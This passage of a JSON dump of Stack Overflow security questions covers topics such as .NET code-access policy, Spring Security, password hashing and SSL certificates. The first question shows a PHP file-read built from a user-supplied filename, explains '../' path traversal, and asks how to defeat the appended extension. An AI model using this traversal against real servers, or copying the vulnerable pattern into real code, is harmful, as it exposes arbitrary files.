$extension);\necho file_get_contents($fullFilename);\n</code></pre>\n\n<p>We all know (at least I hope so) that prepending an absolute path is by no way an adequate mean to prevent leaving the given path - one can simply insert one or more \"<code>../</code>\"s to the query string to reach any path on the file system.</p>\n\n<p><strong>My question is: Analogously to the given example, can <code>$_GET['filename']</code> also be manipulated in such a way that the given extension suffix can be bypassed as well</strong>, i.e. a file other than .txt is echoed? I'm especially thinking of certain control characters that bypass the appended file extension in the same fashion as <code>../</code> does with the prefix.</p>\n\n<p>I tried adding some control characters (e.g. ASCII code 127 for delete) to the query string or concatenating two filenames by using <code>&amp;&amp;</code>, <code>|</code> or <code>&gt;</code>, but all to no avail and I wondered if there exists such a possibility at all.</p>\n\n<p>(Btw, I'd like to add the note that this questions is not asked for the purpose to exploit a system. It's purely a hypothetical question that came across my mind recently.)</p>\n"},{"tags":["c#",".net","security"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12731030,"title":"CasPol equivalent for Net 4","body":"<p>With my Net 3.5 application, I had created some entries (using Caspol) to give FullTrust to StrongName assemblies that were signed by our company. This allowed the apps to run from  a network drive without any problems.</p>\n\n<p>Now I have updated the apps to Net 4.0 and would like to create entries (with Caspol???) to allow the apps to run from a network drive when the assemblies have been signed with a code signing certificate (as well as StrongName signing). Under Net 4, is this necessary? What is the syntax for creating Caspol generated permissions for assemblies that are signed (both for code signing certificates and StongName signing)?</p>\n\n<p>I have tried using:</p>\n\n<pre><code>[assembly: System.Security.SecurityRules(System.Security.SecurityRuleSet.Level1)]\n</code></pre>\n\n<p>but this does not solve my problem. Apparently some code is being executed that causes an exception (under Net3.5 this didn't happen)</p>\n\n<p>I have also tried: </p>\n\n<pre><code>&lt;configuration&gt;\n   &lt;runtime&gt;\n      &lt;NetFx40_LegacySecurityPolicy enabled=\"true\"/&gt;\n   &lt;/runtime&gt;\n&lt;/configuration&gt;\n</code></pre>\n\n<p>but my app will not even startup!</p>\n\n<p>TIA,\nMartin.</p>\n"},{"tags":["c#","security","ironpython","customclasses"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12721998,"title":"Secure and protect classes or DLLs in .NET from being used in IronPython","body":"<p>I want to use ironpython inside my C# App, but I am afraid that it will cause a security issue, I don't want the end user to use all the available DLLs of my App, instead I want to provide custom classes that user can use in python.</p>\n\n<p>My question is how to secure my dlls from being used in ironpython.\nthe end user may addReference of the dll, I want to secure most of the classes from being used.</p>\n\n<p>Thank you and regard.</p>\n"},{"tags":["security","plugins","add-on","review"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":1,"view_count":43,"score":0,"question_id":12729697,"title":"Security Code Review Tools","body":"<p>What are the recommended tools for <em>Security</em> Code Review? Can someone give me a review of tools he/she used or maybe a recommendation? </p>\n\n<p>I don't mean tools like Sonar + Findbugs or PMD that do static analysis, I mean software/IDE extensions that can support the manual review process (with focus on security) e.g. contextual code analysis.</p>\n\n<p>Thanks</p>\n"},{"tags":["ruby-on-rails","security","file","download"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12729046,"title":"Best way to set file-download permissions on Rails 3","body":"<p>I want to secure some files that are on my site, but also I want to give permissions to some users to download that files. What is the best way to do it? </p>\n\n<p>I have only one idea - generate temporary random URL's like <code>/files/hdad8fda299asnfqe/foo.bar</code></p>\n\n<p>But I hardly want that other users can not use others URLs.</p>\n\n<p>Do you know any gem that can help me or suggest another way to secure files?</p>\n"},{"tags":["java","flex","security","jboss","blazeds"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":2861,"score":4,"question_id":1715296,"title":"Client.Error.MessageSend problem with Flex/BlazeDS on JBoss","body":"<p>I'm developing a Flex 3.4 app that interops with a Java EE backend running on a JBoss-4.2.2 server, through the most recent release of BlazeDS. When I ran the Flex app from Flash Builder 4 beta 2 on Tomcat, everything was fine, the Flex app was able to make the remote call needed. But my production environment is on JBoss, and when I moved the app to JBoss (with services-config.xml updated to fit JBoss), the Flex app keeps complaining Client.Error.MessageSend upon remote calls.\nAt first, when I manually deployed the app to JBoss, the faultDetail was <code>\"Channel.Security.Error error Error #2048 ... \"</code>; later I tried to run the app from Flash Builder, and then faultDetail became <code>\"Channel.Connect.Failed error NetConnection.Call.BadVersion\"</code>.</p>\n\n<p>In services-config.xml, under <code>&lt;security&gt;</code>, was:</p>\n\n<pre><code>&lt;login-command class=\"flex.messaging.security.TomcatLoginCommand\" server=\"Tomcat\"/&gt;\n</code></pre>\n\n<p>when moving to JBoss, I updated it to:</p>\n\n<pre><code>&lt;login-command class=\"flex.messaging.security.TomcatLoginCommand\" server=\"JBoss\"/&gt;\n</code></pre>\n\n<p>I have a crossdomain.xml placed in JBoss' deploy folder, as follows:</p>\n\n<pre><code>&lt;?xml version=\"1.0\"?&gt; \n&lt;!DOCTYPE cross-domain-policy \n    SYSTEM \"http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd\"&gt; \n    &lt;cross-domain-policy&gt; \n    &lt;allow-access-from domain=\"*\" /&gt; \n&lt;/cross-domain-policy&gt;\n</code></pre>\n\n<p>But looks like it doesn't work. I've also tried to put crossdomain.xml in deploy/xxxxx.war folder, and the problem remains.</p>\n\n<p>I'm using http://, not https://, so I guess it's not about security channel.</p>\n\n<p>Tried to search for a solution, but most solutions were PHP related, which wasn't really helpful. Any one got any clues?</p>\n"},{"tags":["spring","security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":76,"score":2,"question_id":12701154,"title":"Spring Security Error Pages using Forward","body":"<p>I want to display a custom error page on authentication denial (I am using a pre-authenticated secnario) and also access denial from Spring Security 3.0.X</p>\n\n<p>Understand we can use the following to perform this:</p>\n\n<p></p>\n\n<p>\n        \n        \n    </p>\n\n<pre><code>&lt;beans:bean id=\"authenticationEntryPoint\" class=\"org.springframework.security.web.authentication.LoginUrlAuthenticationEntryPoint\"&gt;\n    &lt;beans:property name=\"loginFormUrl\" value=\"/error.jsp\"/&gt;\n&lt;/beans:bean&gt;\n\n&lt;beans:bean id=\"accessDeniedHandler\" class=\"org.springframework.security.web.access.AccessDeniedHandlerImpl\"&gt;\n    &lt;beans:property name=\"errorPage\" value=\"/error.jsp\"/&gt;\n&lt;/beans:bean&gt;\n</code></pre>\n\n<p>but doing this results in a redirect and not a forward to the error page. Anyway to perform forward to an error page (so that we can set some attributes in the request)</p>\n\n<p>Thanks </p>\n"},{"tags":["security","deployment","jetty","war"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12727339,"title":"Security error in WebAppContext jetty","body":"<blockquote>\n  <p>When trying to deploy war file in jetty using web app context, the following exception is thrown </p>\n  \n  <p>The code is as follows:</p>\n</blockquote>\n\n<pre><code>WebAppContext wac = new WebAppContext();\nwac.setContextPath(\"/MYSERVER\");\nwac.setWar(\"java-monitor.war\");\n</code></pre>\n\n<blockquote>\n  <p>I am using jetty 7.6.5 and i am not using org.mortbay i am using org.eclipse.jetty.webapp.WebAppContext;</p>\n  \n  <p>How to solve this problem?</p>\n</blockquote>\n\n<pre><code>Exception in thread \"main\" java.lang.NoClassDefFoundError: org/eclipse/jetty/security/ConstraintSecurityHandler\nat org.eclipse.jetty.servlet.ServletContextHandler.&lt;init&gt;(ServletContextHandler.java:75)\nat org.eclipse.jetty.servlet.ServletContextHandler.&lt;init&gt;(ServletContextHandler.java:106)\nat org.eclipse.jetty.servlet.ServletContextHandler.&lt;init&gt;(ServletContextHandler.java:94)\nat org.eclipse.jetty.webapp.WebAppContext.&lt;init&gt;(WebAppContext.java:170)\nCaused by: java.lang.ClassNotFoundException: org.eclipse.jetty.security.ConstraintSecurityHandler\nat java.net.URLClassLoader$1.run(URLClassLoader.java:202)\nat java.security.AccessController.doPrivileged(Native Method)\nat java.net.URLClassLoader.findClass(URLClassLoader.java:190)\nat java.lang.ClassLoader.loadClass(ClassLoader.java:306)\nat sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)\nat java.lang.ClassLoader.loadClass(ClassLoader.java:247)\n... 5 more\n</code></pre>\n"},{"tags":["database","security","symfony2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12724985,"title":"symfony2 authentification","body":"<p>I want to create SF2 authentification against a database, I used the officiel documentation of SF2, <a href=\"http://symfony.com/doc/2.0/cookbook/security/entity_provider.html\" rel=\"nofollow\">http://symfony.com/doc/2.0/cookbook/security/entity_provider.html</a>, the problem is that the check does not work, I don't know way, I didn't get any error, after entering the user information I still in same page /login, without errors, I don't really get it, If some one could help me I will greatful.</p>\n\n<p>security.yml</p>\n\n<pre><code>security:\nencoders:\n  TEST\\UserBundle\\Entity\\User:\n    algorithm: sha512\n    encode-as-base64: true\n    iterations: 10\n\n\nrole_hierarchy:\n    ROLE_ADMIN:       ROLE_USER\n    ROLE_SUPER_ADMIN: [ROLE_USER, ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]\n\nproviders:\n    main:\n        entity: { class: TESTUserBundle:User, property: username }\n\nfirewalls:\n    login:\n        pattern: ^/(login|reset|accueil)\n        anonymous: true\n    main:\n        pattern: /.*\n        form_login:\n            check_path: /check_login\n            login_path: /login\n        logout:\n            path: /logout\n            target: /login\n        security: true\n        anonymous: false\n\naccess_control:\n    #- { path: ^/login, roles: IS_AUTHENTICATED_ANONYMOUSLY, requires_channel: https }\n    #- { path: ^/_internal, roles: IS_AUTHENTICATED_ANONYMOUSLY, ip: 127.0.0.1 }\n    #- { path: ^/admin, roles: ROLE_ADMIN }\n</code></pre>\n\n<p>the problem is that the error always null, this is my login form </p>\n\n<pre><code>            {% if error == 1 %}\n        &lt;span class=\"pw-alert\"&gt;E-mail et/ou mot de passe erroné(s)&lt;/span&gt;\n        {% endif %}\n                &lt;form action=\"{{ path('_security_check_user') }}\" method=\"POST\"&gt;\n    &lt;div&gt;\n        &lt;label for=\"username\"&gt;Username:&lt;/label&gt;\n        &lt;input type=\"email\" id=\"username\" name=\"_username\" value=\"{{ last_username }}\" /&gt;\n    &lt;/div&gt;\n\n    &lt;div&gt;\n        &lt;label for=\"password\"&gt;Password:&lt;/label&gt;\n        &lt;input type=\"password\" id=\"password\" name=\"_password\" /&gt;\n    &lt;/div&gt;\n                    &lt;input type=\"submit\" value=\"Se connecter\" name=\"login\"/&gt;\n                &lt;/div&gt;\n\n            &lt;/form&gt;\n</code></pre>\n"},{"tags":["wpf","security","internet-explorer","configuration","xbap"],"answer_count":1,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12376868,"title":"Turning off security messages for WPF XBAP applications in Internet Explorer","body":"<p>I'm developing a WPF XBAP application. When i try to open it in Internet Explorer (9.0.8112.16421 Update version 9.0.9 KB2722913, Windows 7) every time security warning is popped up. Twice. \n<img src=\"http://i.stack.imgur.com/bnG1V.png\" alt=\"Security warning\"></p>\n\n<p>That's very annoying and acceptable only in developer environment, there is a need to turn them both off. Project configuration is as follows : Security - \"Enable ClickOnce security settings\" (when its disabled application won't run at all) - \"This is a full trust application\"; \"Signing\" - \"Sign the ClickOne manifests\" (with test certificate which is imported to Trusted Root Certification Authorities). In IE both internet and intranet zones have \"WPF browsers applications\" set to \"Enable\" (that may not have effect because *.xbap is loaded from file system). In case I don't have alternative ways to integrate WPF application into browser (Silverlight is not an option, there is a requirement about full .NET framework targeting) i'm looking for solution of above described problem. Thanks in advance.</p>\n"},{"tags":["web-services","security","ssl","ssl-certificate","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":45,"score":-1,"question_id":12725568,"title":"How to handle SSL server certificate in production?","body":"<p>I'm setting up SSL in my site for the first time and I wonder if there are any guidelines regarding the handling of certificates.</p>\n\n<p>What is the best practice regarding handling my SSL server certificate? Should it be put in source control? If not, where? Are there any Does and Don'ts I should follow?</p>\n"},{"tags":["security","http","tcp","port","firewall"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":33,"score":-1,"question_id":12723882,"title":"Random ports being used by client machine to access a service","body":"<p>In a web server we need to open Port (default:80) in the Firewall to make website accessible from client machine. Now my question is about the client machine, client would be browsing the application using a browser, again it would be using a port from the client machine to send and receive data. when I run netstat command</p>\n\n<p>Proto:TCP| Local Address:local-ip:49393 | Foregin Address:stackoverflow:http | State:ESTABLISHED</p>\n\n<p>and I believe the port no changes for each request, and does that means ports in the client are open to public? and also is through the same port request and response is being send between server and client?</p>\n"},{"tags":["security","url"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":24,"score":-1,"question_id":12724868,"title":"Security issue! Make applications unreachable from outside","body":"<p>Im working with scriptcase,php code generator (hope anyone knows it) inwhich i create projects based on the pre-build forms of Scriptcase. Each application has it's own folder. Now..\nWhen i try to access the menu.php file directly from the url bar (ex: \n    <code>http://192.168.1.111/projectfolder/menu/menu.php</code>     ), it shows me a message \"unauthorised user\" since i haven't logged in. But when i try to access in the same way another file of the same project, i can open it right away! No login required! What i want is to protect all of my files, so outsides won't be able to access them without preregistration. How can i do it? I tried to deploy each application apart and have them assigned the login app as the initial app, in the deploy process..but no luck!</p>\n\n<p>What should i do??</p>\n\n<p>Looking forward to a response..\nAll the best</p>\n"},{"tags":["asp.net","security","asp-classic"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":79,"score":0,"question_id":12648698,"title":"Why are ASP.NET more secure than ASP Classic?","body":"<p>I've read several places that ASP.NET are more secure than ASP Classic. But never seen any actual arguments of why.</p>\n\n<p>Using a standard login system as an example.\nThe user sends a username and a password to the server via forms. This is done the same way in both languages. And in both languages the rest is done on the server.\nWhy choose ASP.NET over ASP Classic here?</p>\n"},{"tags":["database","security","passwords"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12722051,"title":"Store password in database","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/615704/preferred-method-of-storing-passwords-in-database\">Preferred Method of Storing Passwords In Database</a>  </p>\n</blockquote>\n\n\n\n<p>My problem is similar to this one discussed here: <a href=\"http://stackoverflow.com/questions/1054022/best-way-to-store-password-in-database\">Best way to store password in database</a></p>\n\n<p>I need to store passwords of external FTP logins in the database which will be used by the application. The solution of the linked topic is not applicable because it's hashing the password.</p>\n\n<p>I'm using C# and connecting to a SQL Server 2008. Does someone has an example solution? I think I just have to encrypt the password, store it in ecrypted form and if the application wants to use the password -> decrypt.</p>\n"},{"tags":["android","security"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":172,"score":1,"question_id":9665411,"title":"Is it possible programmatically (on non rooted android phones) to check which servers(url) are the installed apps connecting to in the background?","body":"<p>Can a security app check what servers(urls) is another app is trying to connect? </p>\n\n<p>I know about android sandboxing but is there still a way using PackageManager or any other API/technique to get this piece of info programmatically using public SDK only, for Non Rooted android phones? </p>\n"},{"tags":["spring","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":144,"score":0,"question_id":11266878,"title":"Spring security - 404 error","body":"<p>Why when I add </p>\n\n<pre><code>     &lt;filter&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;\n&lt;/filter&gt;\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n</code></pre>\n\n<p>to my project it's not working and I get:  HTTP Status 404. But when I remove the filter dependency, it works again. </p>\n\n<p>Any idea why?  Why it cause the error? </p>\n\n<p>Here is my web.xml</p>\n\n<pre><code> &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n &lt;web-app xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxmlns=\"http://java.sun.com/xml/ns/javaee\" xmlns:web=\"http://java.sun.com/xml/ns/javaee      /web-app_2_5.xsd\"\nxsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\"\nversion=\"2.5\"&gt;\n\n\n&lt;!-- Define the basename for a resource bundle for I18N --&gt;\n&lt;context-param&gt;\n    &lt;param-name&gt;javax.servlet.jsp.jstl.fmt.localizationContext&lt;/param-name&gt;\n    &lt;param-value&gt;messages&lt;/param-value&gt;\n&lt;/context-param&gt;\n\n&lt;context-param&gt;\n    &lt;param-name&gt;contextClass&lt;/param-name&gt;\n    &lt;param-value&gt;org.springframework.web.context.support.AnnotationConfigWebApplicationContext\n    &lt;/param-value&gt;\n\n&lt;/context-param&gt;\n\n&lt;!-- Creates the Spring Container shared by all Servlets and Filters --&gt;\n&lt;listener&gt;\n    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;\n&lt;/listener&gt;\n&lt;!-- The definition of the Root Spring Container shared by all Servlets \n    and Filters --&gt;\n&lt;context-param&gt;\n    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n    &lt;param-value&gt;\n        classpath:/META-INF/root-context.xml,\n        classpath:/META-INF/appServlet/spring-security.xml\n    &lt;/param-value&gt;\n\n&lt;/context-param&gt;\n\n&lt;!-- Processes application requests --&gt;\n&lt;servlet&gt;\n    &lt;servlet-name&gt;appServlet&lt;/servlet-name&gt;\n    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;\n    &lt;init-param&gt;\n        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;\n            classpath:/META-INF/appServlet/servlet-context.xml\n\n            &lt;/param-value&gt;\n    &lt;/init-param&gt;\n    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;\n&lt;/servlet&gt;\n&lt;servlet-mapping&gt;\n    &lt;servlet-name&gt;appServlet&lt;/servlet-name&gt;\n    &lt;url-pattern&gt;/&lt;/url-pattern&gt;\n&lt;/servlet-mapping&gt;\n\n&lt;filter&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;\n&lt;/filter&gt;\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n\n   &lt;/web-app&gt;\n</code></pre>\n\n<p>and here is my spring_security.xml</p>\n\n<pre><code>    &lt;beans:beans xmlns=\"http://www.springframework.org/schema/security\"\nxmlns:beans=\"http://www.springframework.org/schema/beans\" \nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxmlns:security=\"http://www.springframework.org/schema/security\"\nxsi:schemaLocation=\"http://www.springframework.org/schema/beans\nhttp://www.springframework.org/schema/beans/spring-beans-3.0.xsd\nhttp://www.springframework.org/schema/security\nhttp://www.springframework.org/schema/security/spring-security-3.0.3.xsd\"&gt;\n\n&lt;security:http auto-config=\"true\"&gt;\n    &lt;security:intercept-url pattern=\"/welcome*\" access=\"ROLE_USER\" /&gt;\n    &lt;security:form-login login-page=\"/login\" default-target-url=\"/welcome\"\n        authentication-failure-url=\"/loginfailed\" /&gt;\n    &lt;security:logout logout-success-url=\"/logout\" /&gt;\n&lt;/security:http&gt;\n\n&lt;security:authentication-manager&gt;\n    &lt;security:authentication-provider&gt;\n        &lt;security:jdbc-user-service data-source-ref=\"dataSource\"\n\n            users-by-username-query=\"\n                select username,password, enabled \n                from users where USERNAME=?\" \n\n            authorities-by-username-query=\"\n                select u.username, ur.authority from users u, user_roles ur \n                where u.user_id = ur.user_id and u.username =?  \" \n\n        /&gt;\n    &lt;/security:authentication-provider&gt;\n&lt;/security:authentication-manager&gt;\n\n   &lt;/beans:beans&gt;\n</code></pre>\n"},{"tags":["java","php","forms","security","applet"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12684778,"title":"Applet Upload Error","body":"<p>I want to upload some files from client pc to my web server and I am using following code in Java applet I have also signed applet successfully and it prompt for Trust the applet see code here, but it does not uploads the file</p>\n\n<pre><code>import java.applet.Applet;\nimport java.net.*;\nimport java.io.*;\nimport java.util.*;\npublic class UploaderExample extends Applet\n{\nprivate static final String Boundary = \"--7d021a37605f0\";\n\npublic void upload(URL url, List&lt;File&gt; files) throws Exception\n{\n    HttpURLConnection theUrlConnection = (HttpURLConnection) url.openConnection();\n    theUrlConnection.setDoOutput(true);\n    theUrlConnection.setDoInput(true);\n    theUrlConnection.setUseCaches(false);\n    theUrlConnection.setChunkedStreamingMode(1024);\n\n    theUrlConnection.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\"\n            + Boundary);\n\n    DataOutputStream httpOut = new DataOutputStream(theUrlConnection.getOutputStream());\n\n    for (int i = 0; i &lt; files.size(); i++)\n    {\n        File f = files.get(i);\n        String str = \"--\" + Boundary + \"\\r\\n\"\n                   + \"Content-Disposition: form-data;name=\\\"file\" + i + \"\\\"; filename=\\\"\" + f.getName() + \"\\\"\\r\\n\"\n                   + \"Content-Type: image/png\\r\\n\"\n                   + \"\\r\\n\";\n\n        httpOut.write(str.getBytes());\n\n        FileInputStream uploadFileReader = new FileInputStream(f);\n        int numBytesToRead = 1024;\n        int availableBytesToRead;\n        while ((availableBytesToRead = uploadFileReader.available()) &gt; 0)\n        {\n            byte[] bufferBytesRead;\n            bufferBytesRead = availableBytesToRead &gt;= numBytesToRead ? new byte[numBytesToRead]\n                    : new byte[availableBytesToRead];\n            uploadFileReader.read(bufferBytesRead);\n            httpOut.write(bufferBytesRead);\n            httpOut.flush();\n        }\n        httpOut.write((\"--\" + Boundary + \"--\\r\\n\").getBytes());\n\n    }\n\n    httpOut.write((\"--\" + Boundary + \"--\\r\\n\").getBytes());\n\n    httpOut.flush();\n    httpOut.close();\n\n    // read &amp; parse the response\n    InputStream is = theUrlConnection.getInputStream();\n    StringBuilder response = new StringBuilder();\n    byte[] respBuffer = new byte[4096];\n    while (is.read(respBuffer) &gt;= 0)\n    {\n        response.append(new String(respBuffer).trim());\n    }\n    is.close();\n    System.out.println(response.toString());\n}\n\npublic static void main(String[] args) throws Exception\n {\n    List&lt;File&gt; list = new ArrayList&lt;File&gt;();\n    list.add(new File(\"C:\\\\square.png\"));\n    list.add(new File(\"C:\\\\narrow.png\"));\n    UploaderExample uploader = new UploaderExample();\n    uploader.upload(new URL(\"http://localhost/test2/upload.php\"), list);\n }\n\n}\n</code></pre>\n\n<p>Console Output is</p>\n\n<pre><code>security: User has granted the priviledges to the code for this session only\nsecurity: Adding certificate in Deployment session certificate store\nsecurity: Added certificate in Deployment session certificate store\nsecurity: Saving certificates in Deployment session certificate store\nsecurity: Saved certificates in Deployment session certificate store\nsecurity: Validate the certificate chain using CertPath API\nsecurity: The certificate hasnt been expired, no need to check timestamping info\nsecurity: Found jurisdiction list file\nsecurity: No need to checking trusted extension for this certificate\nsecurity: The CRL support is disabled\nsecurity: The OCSP support is disabled\nsecurity: This OCSP End Entity validation is disabled\nsecurity: Checking if certificate is in Deployment denied certificate store\nsecurity: Checking if certificate is in Deployment permanent certificate store\nsecurity: Checking if certificate is in Deployment session certificate store\nbasic: Plugin2ClassLoader.getPermissions CeilingPolicy allPerms\nsecurity: Validate the certificate chain using CertPath API\nsecurity: The certificate hasnt been expired, no need to check timestamping info\nsecurity: Found jurisdiction list file\nsecurity: No need to checking trusted extension for this certificate\nsecurity: The CRL support is disabled\nsecurity: The OCSP support is disabled\nsecurity: This OCSP End Entity validation is disabled\nsecurity: Checking if certificate is in Deployment denied certificate store\nsecurity: Checking if certificate is in Deployment permanent certificate store\nsecurity: Checking if certificate is in Deployment session certificate store\nbasic: Applet loaded.\nbasic: Applet resized and added to parent container\nbasic: PERF: AppletExecutionRunnable - applet.init() BEGIN ; jvmLaunch dt 121613 us,       pluginInit dt 29241825 us, TotalTime: 29363438 us\nbasic: Applet initialized\nbasic: Starting applet\nbasic: completed perf rollup\nbasic: Applet made visible\nbasic: Applet started\nbasic: Told clients applet is started\n</code></pre>\n"},{"tags":["php","mysql","security"],"answer_count":7,"favorite_count":0,"up_vote_count":3,"down_vote_count":6,"view_count":425,"score":-3,"question_id":8721578,"title":"Where do I hide my login info when using PHP connect to get to a database?","body":"<p>I need to connect to a <code>mysql database</code> using <strong><code>PHP</code></strong>.  I am storing my login, user, password, and other info in a separate php file (let's say <code>\"mysql_connect.php\"</code>) and then accessing it via require_once <code>(mysql_connect.php)</code> in a different file.  </p>\n\n<p>I have done a bit of googling and I know that I am supposed to keep \"mysql_connect.php\" out of the web root.  I have moved it outside of the html folder and tried calling to it by using \"../../mysql_connect.php\"   This is not working, it gives me an error \"function not found\" or something like that.  Upon googling that, the internet says that its because it can't locate the file i'm referencing.  When I move mysql_connect.php into a folder below root, everything works fine.  The issue is because it is moved outside of the web root (i think).    </p>\n\n<p>I have been googling for two days now and cannot find a detailed explanation on how to get this to work.  Something about changing the .htaccess file?  I've read a bunch of articles on the theory but I am really looking for a step-by-step tutorial (I am a beginner).  The only step-by-step tutorials I can find just tell you to put the config.php file into the same folder which is not secure.  </p>\n\n<p>Also in reading, it says that putting mysql_connect.php above root might not be THE most secure way to store the information as it is still basically just a .txt file and it can be retrieved easily(like downloading it).  I am looking for a balance between secure and also do-able (for a beginner like myself).  The mysql database I am trying to protect will not have any personal information and I plan on using a dedicated server (with no other information on it).\nCan any one help me to solve this issue?  </p>\n"},{"tags":["security",".net-3.5","encryption","cryptography","passwords"],"answer_count":5,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":737,"score":1,"question_id":3098829,"title":".NET 3.5 - Hashing a password using System.Cryptography","body":"<p>I am a bit of a newbie around Security nitty gritties and especially around Cryptography.</p>\n\n<p>In the application we are building(ASP.net application built on .NET 3.5), we are currently using Databases to save our users authentication information (AD etc is not an option at this point).\nThe intention is to do a one way salted hash of the passwords using SHA256Managed on user creation and then validate the users using the same.\nIdeally, we do not want to use any third party dll's for the hashing algorithm unless absolutely necessary to avoid any unnecessary dependencies.</p>\n\n<p>Questions:-\n1. Is there a better option than doing a salted one way hash?\n2. Is SHA256 a reasonably reliable / secure option or should we be considering anything else?\n3. Is the SHA256Managed implementation in System.Cryptography good enough in terms of it speed etc or should we be considering 3rd party alternatives to it?</p>\n\n<p>Any pointers as to the approach / implementation will be helpful.</p>\n"},{"tags":["php","mysql","security","bcrypt"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":38,"score":-6,"question_id":12719965,"title":"php bcrypt implement","body":"<p>Sorry I am new to PHP and is inspired to its flexibility.\nI seen lots of places on the web talk about and the use of Bcrypt. Where can I learn more about this in how to implement this and set up the DB to store this info?\nI'm looking for some tutorial on how to set bcrypt up from start to finish while using salt.\nCan someone lead me in the right direction, please.</p>\n"},{"tags":[".net","security","passwords","hash"],"answer_count":9,"favorite_count":2,"up_vote_count":7,"down_vote_count":1,"view_count":2102,"score":6,"question_id":1841595,"title":"Secure Password Hashing","body":"<p>I need to store a hash of a single password in a .Net WinForms application.</p>\n\n<p>What's the most secure way to do this?</p>\n\n<p>In particular:</p>\n\n<ul>\n<li>Salt, HMAC, or both?</li>\n<li>How much salt?</li>\n<li>How many iterations?</li>\n<li>What encoding? (The password is plain ASCII)</li>\n</ul>\n\n<p>I assume that the algorithm should be either SHA512 or HMACSHA512.</p>\n"},{"tags":["php","security","session","session-variables"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":12719096,"title":"Understanding session save path as no value and security","body":"<p>I only use sessions to store variables and was hoping to ensure that the session save path could not be tampered with by any of the users. So I went to check my phpinfo and found that the session save path was set to no value. Is this normal for users who only use sessions for variables? Do I have anything to worry about if the sessions save path is set to no value? </p>\n"},{"tags":["security","ssl","cryptography","bouncycastle","certificates"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1486,"score":1,"question_id":7984945,"title":"\"The credentials supplied to the package were not recognized\" error when authenticating as server with certificate generated using BouncyCastle","body":"<p>I'm trying to create a certificate using the BouncyCastle.Crypto dll, which is then used to authenticate a SslStream as the server in a Windows Service process, which runs under the Local System account.</p>\n\n<p>However when I get to the SslStream.AuthenticateAsServer(certificate) call, it throws a Win32 exception with the error message \"The credentials supplied to the package were not recognized\".</p>\n\n<p>There are several questions on here about this error message, but none of them seem to describe, or solve, my particular problem.  </p>\n\n<p>In the hope that someone may be able to offer some help, I include the code I am using to create and install the certificate:</p>\n\n<pre><code>// First create a certificate using the BouncyCastle classes\nBigInteger serialNumber = BigInteger.ProbablePrime(120, new Random());\nAsymmetricCipherKeyPair keyPair = GenerateKeyPair();\n\nX509V1CertificateGenerator generator = new X509V1CertificateGenerator();\ngenerator.SetSerialNumber(serialNumber);\ngenerator.SetIssuerDN(new X509Name(\"CN=My Issuer\"));\ngenerator.SetNotBefore(DateTime.Today);\ngenerator.SetNotAfter(DateTime.Today.AddYears(100));\ngenerator.SetSubjectDN(new X509Name(\"CN=My Issuer\"));\ngenerator.SetPublicKey(keyPair.Public);\ngenerator.SetSignatureAlgorithm(\"SHA1WITHRSA\");\n\nOrg.BouncyCastle.X509.X509Certificate cert = generator.Generate(\n    keyPair.Private, 